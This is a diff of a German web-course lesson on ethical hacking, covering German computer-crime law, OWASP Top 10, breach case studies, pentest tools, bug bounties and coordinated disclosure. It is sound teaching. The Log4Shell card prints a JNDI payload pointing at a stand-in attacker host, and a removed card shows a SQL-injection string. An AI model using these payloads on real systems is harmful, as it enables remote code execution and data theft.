@@ -5165,88 +5165,811 @@ eingabe = <span class="st">b"meinPasswort123"</span>
             <h1 class="lesson-title">Ethical Hacking — Legal & Richtig</h1>
             <p class="lesson-desc">Hacking bedeutet: Systeme so tief verstehen dass du ihre Schwächen findest. Ethical Hacking bedeutet: das nur mit Erlaubnis zu tun. Hier lernst du wie Angreifer denken — um dich zu verteidigen.</p>
           </div>
-          <div class="content-card animate-in" style="animation-delay:0.05s">
-            <div class="card-label">Die wichtigste Regel</div>
-            <div class="explanation">
-              <strong>Hacking ohne Erlaubnis ist illegal.</strong><br><br>
-              Ethical Hacker haben immer schriftliche Erlaubnis. Zum Üben gibt es legale Plattformen:<br><br>
-              • <strong>TryHackMe</strong> — Anfängerfreundlich, geführte Lernpfade<br>
-              • <strong>HackTheBox</strong> — Realistischere Maschinen, mehr Herausforderung<br>
-              • <strong>picoCTF</strong> — Kostenlose CTF-Wettbewerbe für Einsteiger<br>
-              • <strong>DVWA</strong> — Absichtlich verwundbare Webseite zum lokalen Üben
-            </div>
-          </div>
-          <div class="content-card animate-in" style="animation-delay:0.08s">
-            <div class="card-label">Die OWASP Top 10 — häufigste Web-Schwachstellen</div>
-            <div class="explanation">
-              <strong>1. SQL Injection</strong> — Datenbankbefehle in Eingabefelder einschleusen<br>
-              <strong>2. Broken Authentication</strong> — Schwache Passwörter, fehlende 2FA<br>
-              <strong>3. XSS (Cross-Site Scripting)</strong> — JavaScript in Webseiten einschleusen<br>
-              <strong>4. Insecure Direct Object Reference</strong> — Zugriff auf fremde Daten durch URL-Manipulation<br>
-              <strong>5. Security Misconfiguration</strong> — Falsch konfigurierte Server
-            </div>
-            <div class="code-block" style="margin-top:14px">
-              <div class="code-block-header"><span class="code-lang">SQL Injection — Beispiel</span></div>
-              <div class="code-pre"><span class="cm"># Gefährlicher Code (NIEMALS so schreiben)</span>
-eingabe = <span class="st">"' OR '1'='1"</span>  <span class="cm"># Angreifer-Input</span>
-query = <span class="st">f"SELECT * FROM users WHERE name='{eingabe}'"</span>
-<span class="cm"># Ergebnis: SELECT * FROM users WHERE name='' OR '1'='1'</span>
-<span class="cm"># Das gibt ALLE User zurück — Sicherheitslücke</span>
 
-<span class="cm"># Sicher: Parameterisierte Queries verwenden</span>
-cursor.execute(<span class="st">"SELECT * FROM users WHERE name=?"</span>, (eingabe,))</div>
+          <div class="content-card animate-in" style="animation-delay:0.05s" style="border:1px solid var(--red); background:linear-gradient(135deg, rgba(247,106,106,0.08), transparent)">
+            <div class="card-label" style="color: var(--red)">⚠ Wichtigste Regel zuerst</div>
+            <div class="explanation">
+              <strong>Was du in dieser Phase lernst, kannst du missbrauchen — oder einsetzen um andere zu schützen. Die Wahl ist deine.</strong><br><br>
+              <strong>In Deutschland gilt §202a-d StGB</strong> ("Hackerparagraph"). Strafbar ist <em>jeder</em> unbefugte Zugriff auf fremde Systeme — auch ohne Schaden, auch wenn du nichts kopierst, auch wenn du "nur testen" wolltest. Bis zu <strong>3 Jahre Haft</strong>.<br><br>
+              <strong>Auch strafbar:</strong><br>
+              • Bekannte Schwachstelle ausnutzen ohne Erlaubnis<br>
+              • Hacking-Tools mit "Schädigungsabsicht" entwickeln/besorgen (§202c)<br>
+              • Daten manipulieren oder löschen (§303a)<br>
+              • Computer-Sabotage (§303b)<br><br>
+              <strong>Erlaubt ist nur:</strong><br>
+              ✓ Eigene Systeme angreifen (dein Laptop, deine Webseite)<br>
+              ✓ Systeme mit <em>schriftlicher</em> Erlaubnis des Eigentümers<br>
+              ✓ Bug-Bounty-Programme (offizielle Einladung zum Hacken)<br>
+              ✓ CTF-Plattformen und absichtlich verwundbare Lab-Umgebungen<br><br>
+              "Aber ich wollte doch nur helfen" ist <strong>keine Verteidigung</strong>. Selbst wenn du eine Sicherheitslücke findest und den Betreiber informierst — wenn du sie ohne Erlaubnis ausgenutzt hast, kannst du angeklagt werden. Es gibt einen Weg: <strong>Coordinated Vulnerability Disclosure</strong> (siehe weiter unten).
             </div>
           </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.07s">
+            <div class="card-label">Warum überhaupt Cybersecurity lernen?</div>
+            <div class="explanation">
+              <strong>Als Entwickler:</strong> du baust Systeme. Wenn du nicht weißt wie Angreifer denken, baust du Sicherheitslücken ein die du nie sehen wirst. Sicherheit nachträglich draufzukleben funktioniert nicht — sie muss von Anfang an mitgedacht werden.<br><br>
+              <strong>Als Karriere:</strong> Cybersecurity ist eine der bestbezahlten und gefragtesten IT-Branchen. In Deutschland fehlen ~100.000 Sicherheitsexperten. Penetrationstester verdienen 60-100k+ €/Jahr.<br><br>
+              <strong>Als Bürger:</strong> du verstehst was wirklich passiert wenn du eine Email öffnest, ein Passwort eingibst, oder ein WLAN nutzt. Du wirst zum schwierigeren Ziel.<br><br>
+              <strong>Tatsache:</strong> Cybercrime kostet die Weltwirtschaft inzwischen <strong>über 8 Billionen $ pro Jahr</strong> — mehr als der globale Drogenhandel. Jeder Klick zählt.
+            </div>
+          </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.1s">
+            <div class="card-label">Die CIA-Triade — die Grundsäulen der Sicherheit</div>
+            <div class="explanation">
+              Jedes Sicherheitskonzept dreht sich um drei Dinge — die <strong>CIA-Triade</strong>:
+            </div>
+            <div class="code-block" style="margin-top:10px">
+              <div class="code-block-header"><span class="code-lang">CIA</span></div>
+              <div class="code-pre">  C  Confidentiality   Vertraulichkeit
+                       Nur autorisierte Personen lesen die Daten.
+                       Bedroht durch: Datenleaks, Abhören, Diebstahl.
+                       Schutz: Verschlüsselung, Zugriffskontrolle.
+
+  I  Integrity         Integrität
+                       Daten werden nicht (unbemerkt) verändert.
+                       Bedroht durch: Manipulation, MITM-Angriffe.
+                       Schutz: Hashes, Signaturen, Logs.
+
+  A  Availability      Verfügbarkeit
+                       Das System läuft wenn es gebraucht wird.
+                       Bedroht durch: DDoS, Hardware-Ausfälle, Ransomware.
+                       Schutz: Backups, Redundanz, Rate-Limiting.</div>
+            </div>
+            <div class="explanation" style="margin-top:12px">
+              <strong>Beispiel Online-Banking:</strong><br>
+              • <em>Confidentiality</em> — niemand außer dir sieht deinen Kontostand<br>
+              • <em>Integrity</em> — niemand kann den Überweisungsbetrag unterwegs ändern<br>
+              • <em>Availability</em> — die App läuft auch wenn 1 Million User gleichzeitig zugreifen<br><br>
+              Wenn EINER der drei Punkte fehlt, ist das System unsicher.
+            </div>
+          </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.13s">
+            <div class="card-label">Hacker-Typen — wer ist wer?</div>
+            <div class="explanation">
+              "Hacker" ist nicht gleich Hacker. Der ursprüngliche Begriff bedeutet einfach <em>jemand der ein System tief versteht und kreativ damit umgeht</em>. Heute unterscheidet man:
+            </div>
+            <div class="code-block" style="margin-top:10px">
+              <div class="code-block-header"><span class="code-lang">Hacker-Klassifizierung</span></div>
+              <div class="code-pre">  WHITE HAT     Ethical Hacker
+                Mit Erlaubnis. Macht Pentests, findet Bugs für Bounty.
+                Beispiele: Sicherheitsforscher, Red-Teams in Firmen.
+
+  GREY HAT      Graue Zone
+                Ohne Erlaubnis, aber meist gut gemeint.
+                Findet Lücke, meldet sie — manchmal erst nach Druck.
+                Strafbar! Auch wenn die Absicht gut war.
+
+  BLACK HAT     Kriminelle
+                Ohne Erlaubnis, mit Schädigungs- oder Bereicherungs-Absicht.
+                Ransomware-Banden, Datendiebe, Erpresser.
+
+  SCRIPT KIDDIE Ohne tieferes Wissen
+                Lädt fertige Tools runter, klickt "Attack".
+                Statistisch die häufigste Bedrohung.
+
+  HACKTIVIST    Politisch motiviert
+                Anonymous, LulzSec — DDoS gegen Regierungen, Leak-Aktionen.
+
+  STATE ACTOR   Geheimdienste
+                NSA, GRU, MSS, Mossad. Höchste Ressourcen, monatelange Operationen.
+                Stuxnet, SolarWinds — typische Beispiele.</div>
+            </div>
+            <div class="explanation" style="margin-top:12px">
+              In Firmen sind <strong>Red-Team</strong> = die simulierten Angreifer und <strong>Blue-Team</strong> = die Verteidiger. Manche Firmen haben beides als regelmäßige Übung.
+            </div>
+          </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.16s">
+            <div class="card-label">Die Cyber Kill Chain — wie ein Angriff abläuft</div>
+            <div class="explanation">
+              Fast jeder echte Angriff folgt diesen Schritten — entwickelt von Lockheed Martin. Wenn du einen Schritt verstehst, kannst du auch dort verteidigen.
+            </div>
+            <div class="code-block" style="margin-top:10px">
+              <div class="code-block-header"><span class="code-lang">Die 7 Schritte</span></div>
+              <div class="code-pre">  1. RECONNAISSANCE   "Aufklärung"
+     Ziel ausspähen: Webseite, LinkedIn, Subdomains, IPs scannen.
+     Tools: nmap, theHarvester, Google-Dorks, Shodan.
+
+  2. WEAPONIZATION    Waffen vorbereiten
+     Exploit + Payload zusammenbauen — z.B. präparierte PDF.
+
+  3. DELIVERY         Zustellung
+     Phishing-Mail, USB-Stick im Parkplatz, infizierte Webseite.
+
+  4. EXPLOITATION     Lücke ausnutzen
+     Schadcode wird auf dem Zielsystem ausgeführt.
+
+  5. INSTALLATION     Hintertür einbauen
+     Persistenz: Backdoor, Trojaner, geplante Aufgabe.
+
+  6. COMMAND & CONTROL  Fernsteuerung
+     Kompromittiertes System verbindet sich zum Angreifer-Server.
+
+  7. ACTIONS ON OBJECTIVE  Das eigentliche Ziel
+     Daten klauen, verschlüsseln (Ransomware), löschen, manipulieren.</div>
+            </div>
+            <div class="explanation" style="margin-top:12px">
+              <strong>Verteidigung:</strong> je früher du den Angreifer stoppst, desto besser. Schritt 1 (Reconnaissance) verhindern ist kaum möglich — aber Schritt 3 (Phishing-Schulungen) und Schritt 5 (Backdoor-Erkennung) ist machbar.
+            </div>
+          </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.19s">
+            <div class="card-label">OWASP Top 10 — die 10 häufigsten Web-Schwachstellen (2021)</div>
+            <div class="explanation">
+              Die <strong>OWASP Foundation</strong> veröffentlicht alle paar Jahre die 10 häufigsten Schwachstellen — basierend auf hunderttausenden echten Pentest-Berichten. Pflichtlektüre für jeden Web-Entwickler.
+            </div>
+            <div class="code-block" style="margin-top:10px">
+              <div class="code-block-header"><span class="code-lang">OWASP Top 10</span></div>
+              <div class="code-pre"><span class="num">A01</span> Broken Access Control
+    User kann auf fremde Daten zugreifen (z.B. /user/42 ändern auf /user/43).
+
+<span class="num">A02</span> Cryptographic Failures
+    Schwache Verschlüsselung, Klartext-Übertragung, MD5 für Passwörter.
+
+<span class="num">A03</span> Injection
+    SQL/Command/LDAP-Injection — Eingaben ungefiltert in Befehle einbauen.
+
+<span class="num">A04</span> Insecure Design
+    Sicherheit war nie geplant. Beispiel: Passwort-Reset ohne Rate-Limit.
+
+<span class="num">A05</span> Security Misconfiguration
+    Default-Passwörter, ungenutzte Features aktiv, Fehlermeldungen verraten zu viel.
+
+<span class="num">A06</span> Vulnerable & Outdated Components
+    Alte Library mit bekannter Lücke (z.B. Log4Shell, siehe unten).
+
+<span class="num">A07</span> Identification & Authentication Failures
+    Schwache Passwörter erlaubt, Session-Tokens vorhersehbar, kein 2FA.
+
+<span class="num">A08</span> Software & Data Integrity Failures
+    CI/CD-Pipeline ohne Signaturen, ungeprüfte Updates, Supply-Chain-Risiken.
+
+<span class="num">A09</span> Security Logging & Monitoring Failures
+    Du merkst den Hack nicht — durchschnittlich erst nach 200+ Tagen.
+
+<span class="num">A10</span> Server-Side Request Forgery (SSRF)
+    Server fragt URLs ab die der Angreifer angibt → interne Systeme erreichbar.</div>
+            </div>
+          </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.22s">
+            <div class="card-label">Fallbeispiel: Equifax (2017) — 147 Millionen geleakte Identitäten</div>
+            <div class="explanation">
+              <strong>Was passierte:</strong> die US-Kreditauskunft Equifax wurde gehackt. Sozialversicherungsnummern, Adressen, Geburtsdaten, Kreditkarten von <strong>147 Millionen Amerikanern</strong> (knapp die Hälfte der USA) wurden gestohlen.<br><br>
+              <strong>Wie?</strong> Eine bekannte Schwachstelle in <em>Apache Struts</em> (Java-Framework). Patch war seit <strong>2 Monaten verfügbar</strong>. Equifax hatte ihn nicht eingespielt.<br><br>
+              <strong>Was OWASP-Kategorie:</strong> A06 (Vulnerable Components).<br><br>
+              <strong>Folgen:</strong><br>
+              • Equifax zahlte 1,4 Milliarden $ Strafen und Vergleiche<br>
+              • CEO und Sicherheitschef traten zurück<br>
+              • Aktie verlor 30%<br>
+              • Daten zirkulieren bis heute im Darknet<br><br>
+              <strong>Lehre:</strong> Patches einspielen ist nicht "lästige Wartung" — es ist <em>kritisch</em>. Über 60% aller Hacks nutzen Schwachstellen für die ein Patch existiert.
+            </div>
+          </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.25s">
+            <div class="card-label">Fallbeispiel: Log4Shell (2021) — die Schwachstelle des Jahrzehnts</div>
+            <div class="explanation">
+              <strong>Was:</strong> Log4j ist eine Java-Logging-Bibliothek, die in Millionen von Apps steckt — von Minecraft über Apple iCloud bis SAP. Eine Schwachstelle erlaubte mit <em>einer einzigen Logmeldung</em> beliebigen Code auf dem Server auszuführen.
+            </div>
+            <div class="code-block" style="margin-top:10px">
+              <div class="code-block-header"><span class="code-lang">Der Exploit war so einfach</span></div>
+              <div class="code-pre"><span class="cm"># Angreifer schickt diesen String — egal wo:
+# Username, Browser-Header, URL, Chat-Nachricht, Bewerbungs-Email...</span>
+
+\${jndi:ldap://angreifer.com/exploit}
+
+<span class="cm"># Wenn die App diesen Text loggt, lädt Log4j den Code von angreifer.com
+# und führt ihn aus. Mit den Rechten des Servers.</span></div>
+            </div>
+            <div class="explanation" style="margin-top:12px">
+              <strong>Warum so schlimm?</strong> Logging ist überall. Jede Webseite die irgendwas loggt war potentiell verwundbar — Millionen Server.<br><br>
+              <strong>Folgen:</strong><br>
+              • Cloudflare blockierte sofort 1,8 Mio Angriffsversuche pro Minute<br>
+              • Geschätzter Wirtschaftsschaden: zweistelliger Milliardenbetrag<br>
+              • Notfall-Patches in der ganzen IT-Welt über Weihnachten 2021<br><br>
+              <strong>Lehre:</strong> du kennst nicht alle Bibliotheken die deine App benutzt. Tools wie <code>npm audit</code>, <code>pip-audit</code>, <code>Dependabot</code> automatisieren die Suche nach bekannten Lücken in deinen Abhängigkeiten.
+            </div>
+          </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.28s">
+            <div class="card-label">Weitere berühmte Angriffe</div>
+            <div class="explanation">
+              <strong>Stuxnet (2010)</strong> — vermutlich von USA + Israel. Sabotierte iranische Atomanreicherung indem es die Zentrifugen sabotierte. Per USB-Stick eingeschleust. Erste echte "Cyberwaffe".<br><br>
+              <strong>WannaCry (2017)</strong> — Ransomware, traf weltweit 200.000 Computer in 150 Ländern. Britischer National Health Service teils komplett lahmgelegt. Schaden: 4 Mrd $. Nutzte eine NSA-Lücke (EternalBlue) die geleakt wurde.<br><br>
+              <strong>SolarWinds (2020)</strong> — russische Geheimdienste manipulierten ein Update der weit verbreiteten Monitoring-Software SolarWinds. 18.000 Unternehmen und mehrere US-Behörden betroffen. Klassischer Supply-Chain-Angriff.<br><br>
+              <strong>Twitter Bitcoin-Hack (2020)</strong> — Teenager überredeten per Telefon-Anruf einen Twitter-Mitarbeiter, ihm Admin-Zugang zu geben. Konten von Obama, Musk, Gates wurden für Bitcoin-Scam missbraucht. Social Engineering at its finest.<br><br>
+              <strong>Colonial Pipeline (2021)</strong> — Ransomware legte die größte US-Benzin-Pipeline lahm. Treibstoffmangel an der Ostküste. Lösegeld von 4,4 Mio $ wurde gezahlt (FBI holte später ~half zurück).<br><br>
+              <strong>MOVEit (2023)</strong> — eine SQL-Injection in einer Filesharing-Software (MOVEit Transfer) traf 2.700+ Organisationen weltweit, darunter Behörden in mehreren Ländern.
+            </div>
+          </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.31s">
+            <div class="card-label">Werkzeuge die jeder Pentester kennt</div>
+            <div class="explanation">
+              Diese Tools sind <strong>legal verfügbar</strong> und werden von Sicherheitsfirmen weltweit eingesetzt. Sie zu kennen ist Pflicht — sie ohne Erlaubnis gegen fremde Systeme einzusetzen ist illegal.
+            </div>
+            <div class="code-block" style="margin-top:10px">
+              <div class="code-block-header"><span class="code-lang">Standard-Toolkit</span></div>
+              <div class="code-pre"><span class="cm">  Aufklärung & Scanning</span>
+  nmap          Port- und Service-Scanner. Klassiker.
+  masscan       Schneller, aber gröber.
+  Shodan        "Google für vernetzte Geräte" (Web-Service).
+  theHarvester  Sammelt Emails/Subdomains aus öffentlichen Quellen.
+  amass         OSINT für Subdomains.
+
+<span class="cm">  Web-Pentesting</span>
+  Burp Suite    DER Web-Proxy. Anfragen analysieren/manipulieren.
+  OWASP ZAP     Open-Source-Alternative zu Burp.
+  sqlmap        Automatisches SQL-Injection-Tool.
+  ffuf / dirb   Versteckte URLs / Verzeichnisse finden.
+  nikto         Web-Server-Scanner.
+
+<span class="cm">  Netzwerk</span>
+  Wireshark     Pakete mitschneiden und analysieren.
+  tcpdump       Wireshark fürs Terminal.
+  Aircrack-ng   WiFi-Sicherheitstests.
+
+<span class="cm">  Exploitation</span>
+  Metasploit    Framework mit hunderten Exploits.
+  msfvenom      Payload-Generator.
+  Cobalt Strike Profi-Tool für Red-Teams (kostenpflichtig).
+
+<span class="cm">  Passwörter</span>
+  hashcat       Schnellster Hash-Cracker (GPU).
+  John the Ripper  Klassischer Passwort-Cracker.
+  hydra         Online-Brute-Force (SSH, FTP, HTTP).
+
+<span class="cm">  All-in-One Distributionen</span>
+  Kali Linux    Linux-System vollgepackt mit Pentest-Tools.
+  Parrot OS     Alternative zu Kali.</div>
+            </div>
+          </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.34s">
+            <div class="card-label">Wo darfst du legal üben?</div>
+            <div class="explanation">
+              <strong>Online-Plattformen (alle haben kostenlose Einsteigerlevel):</strong><br><br>
+              • <strong>TryHackMe</strong> — anfängerfreundlich, geführte Lernpfade vom absoluten Null-Wissen<br>
+              • <strong>HackTheBox</strong> — realistischer, anspruchsvollere Maschinen, wöchentliche Challenges<br>
+              • <strong>picoCTF</strong> — kostenlos, von der Carnegie Mellon University, perfekt für Schüler<br>
+              • <strong>OverTheWire</strong> — klassische Wargames (Bandit ist DER Linux-Einstieg)<br>
+              • <strong>Hack The Box Academy</strong> — strukturierte Kurse mit Zertifikaten<br>
+              • <strong>PortSwigger Web Security Academy</strong> — kostenlos, von den Burp-Suite-Machern, Gold-Standard für Web-Security<br><br>
+              <strong>Lokal/Self-Hosted:</strong><br>
+              • <strong>DVWA</strong> (Damn Vulnerable Web App) — verwundbare PHP-Seite, in Docker laufen lassen<br>
+              • <strong>Juice Shop</strong> — modernste verwundbare Web-App von OWASP, sehr empfehlenswert<br>
+              • <strong>Metasploitable</strong> — verwundbare VM zum Üben mit echten Exploits<br>
+              • <strong>VulnHub</strong> — riesige Sammlung von verwundbaren VMs zum Download<br><br>
+              <strong>CTF-Wettbewerbe:</strong><br>
+              CTFs (Capture The Flag) sind Sicherheits-Wettbewerbe, oft als Teams. <code>ctftime.org</code> listet kommende Events. Großartiger Lerneffekt — und eine echte CTF-Auszeichnung im Lebenslauf öffnet Türen.
+            </div>
+          </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.37s">
+            <div class="card-label">Bug-Bounty — legal hacken und dafür bezahlt werden</div>
+            <div class="explanation">
+              Viele große Firmen (Google, Apple, Microsoft, Facebook, GitHub, Tesla...) haben <strong>Bug-Bounty-Programme</strong>: du bekommst die schriftliche Erlaubnis, ihre Systeme zu hacken — und Geld wenn du etwas findest. Auszahlungen reichen von 100€ für kleine Bugs bis zu <strong>1 Million $</strong> für Zero-Days in iOS/Android.<br><br>
+              <strong>Plattformen:</strong><br>
+              • <strong>HackerOne</strong> — die größte Plattform, viele bekannte Programme<br>
+              • <strong>Bugcrowd</strong> — ähnlich, oft Crowdsourced-Pentests<br>
+              • <strong>Intigriti</strong> — europäisch<br>
+              • <strong>YesWeHack</strong> — französisch, viele EU-Firmen<br><br>
+              <strong>Wichtig:</strong> jedes Programm hat einen <em>Scope</em> — eine Liste was du angreifen darfst und was nicht. Halte dich strikt daran. Wenn du außerhalb des Scopes hackst, bist du wieder bei §202a StGB.
+            </div>
+          </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.4s">
+            <div class="card-label">Coordinated Disclosure — was tun wenn du eine echte Lücke findest?</div>
+            <div class="explanation">
+              Du surfst auf einer normalen Webseite und merkst zufällig: "Hey, ich kann hier einfach durch URL-Manipulation auf fremde Daten zugreifen". Was jetzt?<br><br>
+              <strong>NICHT machen:</strong><br>
+              ✗ Die Lücke ausprobieren ("nur kurz testen")<br>
+              ✗ Daten herunterladen ("ich beweise es")<br>
+              ✗ Auf Twitter posten ("haha guck mal")<br>
+              ✗ Erpressen ("zahl mir 5000€ oder ich verkauf das")<br><br>
+              <strong>So machst du's richtig:</strong><br>
+              1. <strong>Sofort aufhören</strong> — keine weiteren Anfragen<br>
+              2. <strong>Beweise minimal halten</strong> — Screenshot reicht, keine echten Daten<br>
+              3. <strong>Kontakt suchen</strong> — <code>security.txt</code> auf der Webseite, oder <code>security@firma.de</code>, oder die DSGVO-Kontaktstelle<br>
+              4. <strong>Schriftlich melden</strong> — Lücke beschreiben, Reproduktionsschritte, was du NICHT gemacht hast<br>
+              5. <strong>Frist setzen</strong> — z.B. 90 Tage zur Behebung (Standard in der Branche)<br>
+              6. <strong>Erst danach veröffentlichen</strong> — wenn überhaupt<br><br>
+              <strong>In Deutschland:</strong> du kannst dich an das BSI (Bundesamt für Sicherheit in der Informationstechnik) wenden. Die haben einen Coordinated-Disclosure-Prozess.
+            </div>
+          </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.43s">
+            <div class="card-label">Defensive Security — wie schützt du deine eigenen Apps?</div>
+            <div class="explanation">
+              <strong>Die Grundregeln (gilt für jede App, jede Sprache):</strong><br><br>
+              ✓ <strong>Niemals Nutzer-Input vertrauen</strong> — escapen, validieren, parametrisieren<br>
+              ✓ <strong>Prinzip der minimalen Rechte</strong> — App braucht nur SELECT? Dann KEIN DROP TABLE-Recht in der DB<br>
+              ✓ <strong>Defense in Depth</strong> — mehrere Sicherheits-Layer. Ein einzelnes Versagen ≠ Systemversagen<br>
+              ✓ <strong>HTTPS überall</strong> — auch intern, kostet 0€ (Let's Encrypt)<br>
+              ✓ <strong>Updates einspielen</strong> — Server, Libraries, Frameworks. Dependabot/Renovate automatisieren das<br>
+              ✓ <strong>Security Headers setzen</strong> — CSP, HSTS, X-Content-Type-Options, X-Frame-Options<br>
+              ✓ <strong>Logging & Alerts</strong> — du musst merken wenn was passiert<br>
+              ✓ <strong>Backups testen</strong> — Backup das nicht wiederherstellbar ist, ist kein Backup<br>
+              ✓ <strong>Secrets nicht ins Git</strong> — <code>.env</code>, GitHub Secret Scanning<br>
+              ✓ <strong>Code-Reviews mit Sicherheits-Fokus</strong> — vier Augen sehen mehr<br><br>
+              <strong>Tools die helfen:</strong> <code>OWASP ZAP</code> (automatisierte Scans), <code>Snyk</code>/<code>Dependabot</code> (Dependencies), <code>Bandit</code> (Python-Security), <code>ESLint security plugin</code> (JS).
+            </div>
+          </div>
+
+          <div class="content-card animate-in" style="animation-delay:0.46s">
+            <div class="card-label">Karriere in Cybersecurity</div>
+            <div class="explanation">
+              Cybersecurity ist riesig — viele verschiedene Pfade:<br><br>
+              <strong>Penetration Tester</strong> — du wirst dafür bezahlt fremde Systeme zu hacken (mit Erlaubnis). Berichte schreiben, Schwachstellen erklären, Fix-Empfehlungen geben.<br><br>
+              <strong>Security Engineer</strong> — du baust Sicherheit in Software/Systeme ein. Threat-Modeling, Code-Reviews, sichere Architekturen.<br><br>
+              <strong>SOC Analyst</strong> — Security Operations Center. Du überwachst Logs/Alarme und reagierst auf Vorfälle.<br><br>
+              <strong>Incident Responder / Forensiker</strong> — wenn ein Hack passiert, kommst du. Wer war's? Was wurde gemacht? Wie verhindern wir's nächstes Mal?<br><br>
+              <strong>DevSecOps</strong> — Sicherheit in CI/CD-Pipelines integrieren.<br><br>
+              <strong>Cryptographer / Researcher</strong> — du forschst an neuen Verschlüsselungsverfahren oder findest Zero-Days.<br><br>
+              <strong>CISO</strong> — Chief Information Security Officer, leitet die ganze Security-Abteilung.<br><br>
+              <strong>Zertifikate die der Markt anerkennt:</strong><br>
+              • <strong>OSCP</strong> (Offensive Security) — DAS Pentester-Zertifikat, sehr hands-on<br>
+              • <strong>CEH</strong> (Certified Ethical Hacker) — bekannt, eher Wissen als Praxis<br>
+              • <strong>CISSP</strong> — Management-orientiert, hohe Anerkennung<br>
+              • <strong>HackTheBox CPTS / CBBH</strong> — moderne, praxisnahe Alternativen
+            </div>
+          </div>
+
           ${quiz('q12', 'Was ist SQL Injection?', [
             {t:'Ein Angriff bei dem SQL-Befehle in Eingabefelder eingeschleust werden', correct:true, why:'Richtig! Wenn eine App Nutzereingaben direkt in SQL-Queries einbaut ohne sie zu bereinigen, kann ein Angreifer die Datenbankabfrage manipulieren.'},
             {t:'Das Injizieren von CSS in eine Webseite', correct:false, why:'Das wäre CSS Injection — eine andere (seltenere) Schwachstelle. SQL Injection betrifft Datenbanken.'},
             {t:'Ein Virus der SQL-Datenbanken löscht', correct:false, why:'SQL Injection ist eine Webangriffstechnik, kein Virus.'},
             {t:'Eine Methode Passwörter zu erraten', correct:false, why:'Passwörter erraten nennt man Brute-Force. SQL Injection manipuliert Datenbankabfragen.'},
           ])}
+          ${quiz('q12b', 'Du findest beim Surfen einer fremden Webseite zufällig eine Schwachstelle. Was ist legal?', [
+            {t:'Sie ausnutzen um zu beweisen dass sie existiert', correct:false, why:'Auch ohne Schaden ist das nach §202a StGB strafbar. "Ich wollte nur testen" ist keine Verteidigung.'},
+            {t:'Sie sofort melden ohne weitere Tests', correct:true, why:'Genau! Coordinated Disclosure: Lücke beschreiben, Beweise minimal halten, an security@firma.de oder das BSI melden. Das ist legal und der ethisch richtige Weg.'},
+            {t:'Auf Twitter posten damit andere gewarnt sind', correct:false, why:'Sehr gefährlich — du machst die Lücke öffentlich bevor sie behoben ist. Andere können sie sofort ausnutzen.'},
+            {t:'Die Daten herunterladen als Beweis', correct:false, why:'Klar strafbar — auch wenn du sie nicht missbrauchst. Du hast unbefugt auf fremde Daten zugegriffen.'},
+          ])}
+          ${quiz('q12c', 'Was ist die CIA-Triade in der IT-Sicherheit?', [
+            {t:'Eine US-Geheimdienst-Methode', correct:false, why:'Hat nichts mit dem Geheimdienst zu tun — Zufall der Abkürzung.'},
+            {t:'Confidentiality, Integrity, Availability — die drei Säulen jeder Sicherheit', correct:true, why:'Genau! Vertraulichkeit (wer darf lesen), Integrität (Daten unverändert), Verfügbarkeit (System läuft). Wenn EINS fehlt, ist das System unsicher.'},
+            {t:'Drei Hacker-Typen', correct:false, why:'Hacker-Typen sind White/Grey/Black Hat — andere Klassifizierung.'},
+            {t:'Crypto, Internet, Authentication', correct:false, why:'Erfunden — diese Begriffe gibt es als Triade nicht.'},
+          ])}
+          ${quiz('q12d', 'Was ist ein Zero-Day?', [
+            {t:'Eine Schwachstelle die seit dem ersten Tag (Tag 0) bekannt ist', correct:false, why:'Fast umgekehrt — der "Tag 0" bezieht sich auf den Hersteller, der hatte 0 Tage Zeit zum Fix.'},
+            {t:'Eine Schwachstelle die ausgenutzt wird BEVOR sie der Hersteller kennt/patcht', correct:true, why:'Genau! Der Hersteller hat 0 Tage Vorwarnung. Zero-Day-Exploits sind besonders wertvoll und werden auf Schwarzmärkten teuer gehandelt — manche kosten Millionen.'},
+            {t:'Ein Tool das in 0 Sekunden hackt', correct:false, why:'Erfunden — es gibt kein Tool das so etwas garantiert.'},
+            {t:'Ein Sicherheits-Update', correct:false, why:'Updates fixen Lücken, sie sind keine.'},
+          ])}
+          ${quiz('q12e', 'Welches Tool ist DER Standard-Web-Proxy für Pentester?', [
+            {t:'nmap', correct:false, why:'nmap ist ein Port-Scanner für Netzwerke, kein Web-Proxy.'},
+            {t:'Wireshark', correct:false, why:'Wireshark ist ein Netzwerk-Analyzer (Pakete), nicht spezialisiert auf Web.'},
+            {t:'Burp Suite', correct:true, why:'Genau! Burp ist DAS Standard-Tool für Web-Pentests — alle HTTP-Anfragen abfangen, manipulieren, neu senden. Die kostenlose Community Edition reicht zum Lernen.'},
+            {t:'Metasploit', correct:false, why:'Metasploit ist ein Exploit-Framework — nutzt Schwachstellen aus, ist kein Proxy.'},
+          ])}
+
+          <div class="boss-card animate-in" style="animation-delay:0.5s">
+            <div class="boss-label-text"><i data-lucide="sparkles"></i>Praxisaufgaben</div>
+            <div class="boss-title">Deine ersten Schritte als Ethical Hacker</div>
+            <div class="boss-desc">
+              <strong>1.</strong> Registriere dich kostenlos bei <code>tryhackme.com</code>, mach den "Pre Security"-Pfad — komplett gratis.<br><br>
+              <strong>2.</strong> Spiele <strong>OverTheWire Bandit</strong> (overthewire.org/wargames/bandit) bis Level 10 — perfekter Linux+SSH-Einstieg.<br><br>
+              <strong>3.</strong> Schau dir Equifax / Log4Shell auf YouTube an (Suche: "Equifax breach explained", "Log4Shell explained") — verstehe die Geschichte.<br><br>
+              <strong>4.</strong> Lade dir <strong>OWASP Juice Shop</strong> herunter (per Docker: <code>docker run -p 3000:3000 bkimminich/juice-shop</code>), versuche 5 Challenges aus dem Score Board.<br><br>
+              <strong>5.</strong> Lies die offizielle <strong>OWASP Top 10</strong> auf <code>owasp.org/Top10</code> komplett durch.<br><br>
+              <strong>WICHTIG:</strong> bleibe IMMER innerhalb dieser legalen Übungsumgebungen. Nutze nichts gegen fremde Systeme ohne schriftliche Erlaubnis.
+            </div>
+          </div>
         `
       },
       {
-        id: 'l5_2', title: 'XSS & CSRF verstehen',
